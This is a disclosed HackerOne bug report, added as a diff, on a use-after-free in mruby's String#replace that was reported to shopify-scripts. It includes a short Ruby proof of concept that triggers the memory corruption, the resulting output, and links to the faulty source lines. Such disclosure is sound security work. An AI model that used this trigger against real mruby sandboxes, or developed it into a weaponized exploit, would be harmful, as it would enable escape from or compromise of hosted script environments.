@@ -1,0 +1,30 @@
+ReportLink:https://hackerone.com/reports/193143
+WeaknessName:Memory Corruption - Generic
+Reporter:https://hackerone.com/tunz
+ReportedTo:shopify-scripts(shopify-scripts)
+BountyAmount:800.0
+Severity:
+State:Closed
+DateOfDisclosure:31.01.2017 4:35:48
+
+Summary:
+
+#PoC
+```ruby
+$a = "A"*50
+$a.replace($a)
+$b = "B"*50
+puts $a
+```
+
+#Output
+```
+$ ./bin/mruby test6.rb
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+```
+
+The output should be "AAA...", but it prints "BBB...".
+
+#Cause
+`$a` is freed in https://github.com/mruby/mruby/blob/5e3077c00da721ede78c07d2f2e261aded74e7b6/src/string.c#L523
+and, the pointer is assigned to the same pointer in https://github.com/mruby/mruby/blob/5e3077c00da721ede78c07d2f2e261aded74e7b6/src/string.c#L531
